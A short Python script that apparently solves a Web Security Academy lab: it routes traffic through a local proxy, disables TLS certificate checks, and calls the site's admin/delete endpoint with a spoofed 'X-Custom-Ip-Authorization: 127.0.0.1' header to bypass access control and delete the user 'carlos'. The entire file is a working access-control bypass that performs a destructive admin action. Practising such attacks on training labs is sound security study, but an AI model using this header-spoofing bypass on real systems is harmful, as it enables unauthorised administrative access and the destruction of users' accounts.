import requests

# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a1b007b03212dfe808c7c53009b00a4.web-security-academy.net/"  #change to lab URL

final_url  = url + "admin/delete?username=carlos"
headers = {"X-Custom-Ip-Authorization":"127.0.0.1"}
r = requests.get(final_url,verify=False,headers=headers)
print("Carlos deleted")